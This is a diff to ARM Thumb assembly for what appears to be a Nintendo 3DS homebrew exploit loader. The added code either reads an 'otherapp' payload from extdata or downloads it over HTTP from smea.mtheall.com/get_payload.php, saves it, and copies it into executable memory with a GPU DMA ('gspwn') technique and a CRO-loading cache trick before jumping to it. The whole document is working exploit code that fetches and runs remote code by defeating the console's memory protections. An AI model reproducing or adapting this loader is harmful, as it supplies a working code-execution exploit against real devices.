@@ -97,78 +97,248 @@ _cro_text_start:
 .align 1
 .thumb
 main:
-    push {r4-r6,lr}
-    sub sp, #0x14
-    // open extdata archive
-    add r0, sp, #0x8 // archive handle pointer
-    bl FSUSER_OpenArchive
-    bl error_check
-    // open otherapp file
-    add r0, sp, #0x10 // file handle pointer
-    add r1, sp, #0x8 // archive handle pointer
-    adr r2, otherapp_file_path // path
-    mov r3, #1 // open flags
-    bl FSUSER_OpenFile
-    bl error_check
-    // get otherapp size
-    add r0, sp, #0x10 // file handle pointer
-    mov r1, sp // size output pointer
-    bl FSFILE_GetSize
-    bl error_check
-    // round otherapp size to nearest page
-    ldr r6, [sp]
-    ldr r0, =0xfff
-    add r6, r6, r0
-    bic r6, r0
-    // malloc linear for otherapp
-    mov r0, r6 // size
-    bl malloc_linear
-    mov r5, r0
-    // read otherapp file to linear
-    add r0, sp, #0x10 // file handle pointer
-    mov r1, sp // bytes read pointer
-    mov r2, r5 // buffer
-    ldr r3, [sp] // size
-    bl FSFILE_Read
-    bl error_check
-    // close otherapp file
-    add r0, sp, #0x10 // file handle pointer
-    bl FSFILE_Close
-    bl error_check
-    // close extdata archive
-    add r0, sp, #0x8 // archive handle pointer
-    bl FSUSER_CloseArchive
-    bl error_check
+    push {r4,r5,lr}
+    ldr r0, =HID_SHARED_MEM
+    ldr r0, [r0,#0x1c]
+    lsr r0, r0, #1
+    mov r1, #0x80
+    and r0, r1
+    cmp r0, #0
+    beq _main_read
+    bl download_otherapp
+    b _main_download
+_main_read:
+    bl read_otherapp
+_main_download:
     // flush data cache for linear buffer
-    mov r0, r5 // addr
-    mov r1, r6 // size
+    mov r4, r0 // addr
+    mov r5, r1 // size
     bl GSPGPU_FlushDataCache
-    bl error_check
     // gspwn otherapp from linear buffer to code
     ldr r0, =OTHERAPP_VA // dst
-    mov r1, r5 // src
-    mov r2, r6 // size
+    mov r1, r4 // src
+    mov r2, r5 // size
     bl gspwn_aslr
     // clear instruction cache
     bl invalidate_icache
     // setup paramblk in linear buffer
     ldr r0, =GX_TEXTURECOPY
-    str r0, [r5, #0x1c]
+    str r0, [r4, #0x1c]
     ldr r0, =GSPGPU_FLUSHDATACACHE
-    str r0, [r5, #0x20]
+    str r0, [r4, #0x20]
     ldr r0, =GSPGPU_HANDLE_PTR
-    str r0, [r5, #0x58]
+    str r0, [r4, #0x58]
     // jump to otherapp code
-    mov r0, r5
+    mov r0, r4
     ldr r1, =0x0ffffffc
     ldr r2, =OTHERAPP_VA
     blx r2
+    pop {r4,r5,pc}
+.pool
+
+.align 1
+.thumb
+read_otherapp:
+    push {r4,r5,lr}
+    sub sp, #0x14
+    // open extdata archive
+    mov r0, sp // archive handle pointer
+    bl FSUSER_OpenArchive
+    // open otherapp file
+    add r0, sp, #8 // file handle pointer
+    mov r1, sp // archive handle pointer
+    adr r2, otherapp_file_path // path
+    mov r3, #1 // open flags
+    bl FSUSER_OpenFile
+    // get otherapp size
+    add r0, sp, #8 // file handle pointer
+    add r1, sp, #0xc // size output pointer
+    bl FSFILE_GetSize
+    // round otherapp size to nearest page
+    ldr r4, [sp,#0xc]
+    ldr r0, =0xfff
+    add r4, r4, r0
+    bic r4, r0
+    // malloc linear for otherapp
+    mov r0, r4 // size
+    bl malloc_linear
+    mov r5, r0
+    // read otherapp file to linear
+    add r0, sp, #8 // file handle pointer
+    add r1, sp, #0xc // bytes read pointer
+    mov r2, r5 // buffer
+    ldr r3, [sp,#0xc] // size
+    bl FSFILE_Read
+    // close otherapp file
+    add r0, sp, #8 // file handle pointer
+    bl FSFILE_Close
+    // close extdata archive
+    mov r0, sp // archive handle pointer
+    bl FSUSER_CloseArchive
+    mov r0, r5
+    mov r1, r4
     add sp, #0x14
-    pop {r4-r6,pc}
+    pop {r4,r5,pc}
 .pool
 .align 2
 otherapp_file_path:
     .asciz "/otherapp"
+
+.align 1
+.thumb
+download_otherapp:
+    push {r4,r5,lr}
+    sub sp, #0x98
+    add r0, sp, #4
+    adr r1, service_name
+    bl SRV_GetServiceHandle
+    add r0, sp, #4
+    bl HTTPC_Initialize
+    add r0, sp, #0x18
+    adr r1, otherapp_url
+    bl strcpy
+    bl select_version
+    add r0, sp, #4
+    add r1, sp, #8
+    add r2, sp, #0x18
+    bl HTTPC_CreateContext
+    add r0, sp, #0xc
+    adr r1, service_name
+    bl SRV_GetServiceHandle
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_InitializeConnectionSession
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_SetProxyDefault
+    add r0, sp, #0xc
+    add r1, sp, #8
+    adr r2, user_agent_name
+    adr r3, user_agent_value
+    bl HTTPC_AddRequestHeader
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_BeginRequest
+    add r0, sp, #0xc
+    add r1, sp, #0x10
+    add r2, sp, #8
+    bl HTTPC_GetResponseStatusCode
+    add r0, sp, #0x18
+    mov r1, #0x80
+    bl memclr32
+    add r0, sp, #0xc
+    add r1, sp, #8
+    adr r2, location_name
+    mov r3, #0x80
+    str r3, [sp]
+    add r3, sp, #0x18
+    bl HTTPC_GetResponseHeader
+    ldr r0, [sp,#0xc]
+    svc 0x23
+    add r0, sp, #4
+    add r1, sp, #8
+    bl HTTPC_CloseContext
+    add r0, sp, #4
+    add r1, sp, #8
+    add r2, sp, #0x18
+    bl HTTPC_CreateContext
+    add r0, sp, #0xc
+    adr r1, service_name
+    bl SRV_GetServiceHandle
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_InitializeConnectionSession
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_SetProxyDefault
+    add r0, sp, #0xc
+    add r1, sp, #8
+    adr r2, user_agent_name
+    adr r3, user_agent_value
+    bl HTTPC_AddRequestHeader
+    add r0, sp, #0xc
+    add r1, sp, #8
+    bl HTTPC_BeginRequest
+    add r0, sp, #0xc
+    add r1, sp, #0x10
+    add r2, sp, #8
+    bl HTTPC_GetResponseStatusCode
+    add r0, sp, #0xc
+    add r1, sp, #0x10
+    add r2, sp, #8
+    bl HTTPC_GetDownloadSizeState
+    ldr r4, [sp,#0x14]
+    ldr r0, =0xfff
+    add r4, r4, r0
+    bic r4, r0
+    mov r0, r4
+    bl malloc_linear
+    mov r5, r0
+    add r0, sp, #0xc
+    mov r1, r5
+    ldr r2, [sp,#0x14]
+    add r3, sp, #8
+    bl HTTPC_ReceiveData
+    ldr r0, [sp,#0xc]
+    svc 0x23
+    add r0, sp, #4
+    add r1, sp, #8
+    bl HTTPC_CloseContext
+    add r0, sp, #4
+    bl HTTPC_Finalize
+    ldr r0, [sp,#4]
+    svc 0x23
+    // open extdata archive
+    add r0, sp, #4 // archive handle pointer
+    bl FSUSER_OpenArchive
+    // delete existing otherapp file
+    add r0, sp, #4 // archive handle pointer
+    adr r1, otherapp_file_path // path
+    bl FSUSER_DeleteFile
+    // create otherapp file
+    add r0, sp, #4 // archive handle pointer
+    adr r1, otherapp_file_path // path
+    ldr r2, [sp,#0x14] // file size (low)
+    mov r3, #0 // file size (high)
+    bl FSUSER_CreateFile
+    // open otherapp file
+    add r0, sp, #0xc // file handle pointer
+    add r1, sp, #4 // archive handle pointer
+    adr r2, otherapp_file_path // path
+    mov r3, #2 // open flags
+    bl FSUSER_OpenFile
+    // write otherapp file from linear
+    add r0, sp, #0xc // file handle pointer
+    add r1, sp, #0x10 // bytes written pointer
+    mov r2, r5 // buffer
+    ldr r3, [sp,#0x14] // size
+    bl FSFILE_Write
+    // close otherapp file
+    add r0, sp, #0xc // file handle pointer
+    bl FSFILE_Close
+    // close extdata archive
+    add r0, sp, #4 // archive handle pointer
+    bl FSUSER_CloseArchive
+    mov r0, r5
+    mov r1, r4
+    add sp, #0x98
+    pop {r4,r5,pc}
+.pool
+.align 2
+service_name:
+    .asciz "http:C"
+.align 2
+otherapp_url:
+    .asciz "http://smea.mtheall.com/get_payload.php?version=NEW-"
+.align 2
+user_agent_name:
+    .asciz "User-Agent"
+.align 2
+user_agent_value:
+    .asciz "genhax_internal_updater"
+.align 2
+location_name:
+    .asciz "Location"
 
 .align 1
 .thumb
@@ -599,7 +769,6 @@ _gspwn_aslr_linear_loop:
     mov r0, r6 // addr
     ldr r1, =0x1000 // size
     bl GSPGPU_InvalidateDataCache
-    bl error_check
     mov r7, #0
 _gspwn_aslr_virtual_loop:
     ldr r0, [sp]
@@ -685,7 +854,6 @@ invalidate_icache:
     mov r1, r5 // mapped addr
     ldr r2, =ICACHE_SIZE+0x2000 // size
     bl LDRRO_LoadCRO_New
-    bl error_check
     add r5, r5, #0xff
     add r5, r5, #0x81
     blx r5
@@ -721,7 +889,6 @@ _patch_crr_copy_loop:
     mov r0, r5 // addr
     ldr r1, =CRR_HASH_COUNT*0x20 // size
     bl GSPGPU_FlushDataCache
-    bl error_check
     ldr r0, =CRR_START_LINEAR+0x360 // dst
     mov r1, r5 // src
     ldr r2, =CRR_HASH_COUNT*0x20 // size
@@ -766,6 +933,7 @@ FSUSER_OpenFile: // file_handle_ptr, archive_handle_ptr, path, open_flags
     ldmia r4!, {r0-r2} // result code
     str r2, [r5] // file handle
 _FSUSER_OpenFile_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -823,6 +991,7 @@ FSUSER_CreateFile: // archive_handle_ptr, path, file_size_low, file_size_high
     blt _FSUSER_CreateFile_return
     ldr r0, [r4,#4] // result code
 _FSUSER_CreateFile_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -850,6 +1019,7 @@ FSUSER_OpenArchive: // archive_handle_ptr
     ldmia r4!, {r0-r2} // result code
     stmia r5!, {r1,r2} // archive handle
 _FSUSER_OpenArchive_return:
+    bl error_check
     pop {r4-r6,pc}
 .pool
 .align 2
@@ -874,6 +1044,7 @@ FSUSER_CloseArchive: // archive_handle_ptr
     blt _FSUSER_CloseArchive_return
     ldr r0, [r4,#4] // result code
 _FSUSER_CloseArchive_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
@@ -900,6 +1071,7 @@ FSFILE_Read: // file_handle_ptr, bytes_read_ptr, buffer, size
     ldmia r4!, {r0,r1} // result code
     str r1, [r5] // bytes read
 _FSFILE_Read_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -914,9 +1086,11 @@ FSFILE_Write: // file_handle_ptr, bytes_written_ptr, buffer, size
     mov r1, #0 // file offset (low)
     mov r7, r2 // buffer
     mov r2, r1 // file offest (high)
+    stmia r4!, {r0-r3}
+    mov r0, #1
     lsl r6, r3, #4
     add r6, #0xa // size
-    stmia r4!, {r0-r3,r6,r7}
+    stmia r4!, {r0,r6,r7}
     ldr r0, [r5] // file handle
     svc 0x32
     pop {r5}
@@ -926,6 +1100,7 @@ FSFILE_Write: // file_handle_ptr, bytes_written_ptr, buffer, size
     ldmia r4!, {r0,r1} // result code
     str r1, [r5] // bytes written
 _FSFILE_Write_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -947,6 +1122,7 @@ FSFILE_GetSize: // file_handle_ptr, file_size_ptr
     ldmia r4!, {r0-r2} // result code
     stmia r5!, {r1,r2} // file size
 _FSFILE_GetSize_return:
+    bl error_check
     pop {r4,r5,pc}
 .pool
 
@@ -965,14 +1141,18 @@ FSFILE_Close: // file_handle_ptr
     blt _FSFILE_Close_return
     ldr r0, [r4,#4] // result code
 _FSFILE_Close_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
 .align 1
 .thumb
 GSPGPU_FlushDataCache: // addr, size
+    push {lr}
     ldr r2, =GSPGPU_FLUSHDATACACHE
-    bx r2
+    blx r2
+    bl error_check
+    pop {pc}
 .pool
 
 .align 1
@@ -993,6 +1173,7 @@ GSPGPU_InvalidateDataCache: // addr, size
     blt _GSPGPU_InvalidateDataCache_return
     ldr r0, [r4,#4] // result code
 _GSPGPU_InvalidateDataCache_return:
+    bl error_check
     pop {r4-r6,pc}
 .pool
 
@@ -1047,6 +1228,7 @@ LDRRO_LoadCRO_New: // addr, mapped_addr, size
     blt _LDRRO_LoadCRO_New_return
     ldr r0, [r4,#4] // result code
 _LDRRO_LoadCRO_New_return:
+    bl error_check
     pop {r4,r5,pc}
 .pool
 
@@ -1073,6 +1255,7 @@ SRV_GetServiceHandle: // service_handle_ptr, service_name
     ldmia r4!, {r0-r2} // result code
     str r2, [r5] // service handle
 _SRV_GetServiceHandle_return:
+    bl error_check
     pop {r4-r6,pc}
 .pool
 
@@ -1096,6 +1279,7 @@ HTTPC_Initialize: // service_handle_ptr
     blt _HTTPC_Initialize_return
     ldr r0, [r4,#4] // result code
 _HTTPC_Initialize_return:
+    bl error_check
     pop {r4,r5,pc}
 .pool
 
@@ -1122,6 +1306,7 @@ HTTPC_CreateContext: // service_handle_ptr, context_handle_ptr, url
     ldmia r4!, {r0,r1} // result code
     str r1, [r5] // context handle
 _HTTPC_CreateContext_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -1141,6 +1326,7 @@ HTTPC_CloseContext: // service_handle_ptr, context_handle_ptr
     blt _HTTPC_CloseContext_return
     ldr r0, [r4,#4] // result code
 _HTTPC_CloseContext_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
@@ -1163,6 +1349,7 @@ HTTPC_GetDownloadSizeState: // service_handle_ptr, download_state_ptr, context_h
     ldmia r4!, {r0-r2} // result code
     stmia r5!, {r1,r2} // download state
 _HTTPC_GetDownloadSizeState_return:
+    bl error_check
     pop {r4,r5,pc}
 .pool
 
@@ -1184,6 +1371,7 @@ HTTPC_InitializeConnectionSession: // service_handle_ptr, context_handle_ptr
     blt _HTTPC_InitializeConnectionSession_return
     ldr r0, [r4,#4] // result code
 _HTTPC_InitializeConnectionSession_return:
+    bl error_check
     pop {r4-r6,pc}
 .pool
 
@@ -1203,6 +1391,7 @@ HTTPC_BeginRequest: // service_handle_ptr, context_handle_ptr
     blt _HTTPC_BeginRequest_return
     ldr r0, [r4,#4] // result code
 _HTTPC_BeginRequest_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
@@ -1225,6 +1414,7 @@ HTTPC_ReceiveData: // service_handle_ptr, data_buffer, data_buffer_size, context
     blt _HTTPC_ReceiveData_return
     ldr r0, [r4,#4] // result code
 _HTTPC_ReceiveData_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -1244,6 +1434,7 @@ HTTPC_SetProxyDefault: // service_handle_ptr, context_handle_ptr
     blt _HTTPC_SetProxyDefault_return
     ldr r0, [r4,#4] // result code
 _HTTPC_SetProxyDefault_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
@@ -1275,6 +1466,7 @@ HTTPC_AddRequestHeader: // service_handle_ptr, context_handle_ptr, name_buffer, 
     blt _HTTPC_AddRequestHeader_return
     ldr r0, [r4,#4] // result code
 _HTTPC_AddRequestHeader_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -1304,6 +1496,7 @@ HTTPC_GetResponseHeader: // service_handle_ptr, context_handle_ptr, name_buffer,
     blt _HTTPC_GetResponseHeader_return
     ldr r0, [r4,#4] // result code
 _HTTPC_GetResponseHeader_return:
+    bl error_check
     pop {r4-r7,pc}
 .pool
 
@@ -1326,6 +1519,7 @@ HTTPC_GetResponseStatusCode: // service_handle_ptr, status_code_ptr, context_han
     ldmia r4!, {r0,r1} // result code
     str r1, [r5] // status code
 _HTTPC_GetResponseStatusCode_return:
+    bl error_check
     pop {r4,r5,pc}
 .pool
 
@@ -1344,6 +1538,7 @@ HTTPC_Finalize: // service_handle_ptr
     blt _HTTPC_Finalize_return
     ldr r0, [r4,#4] // result code
 _HTTPC_Finalize_return:
+    bl error_check
     pop {r4,pc}
 .pool
 
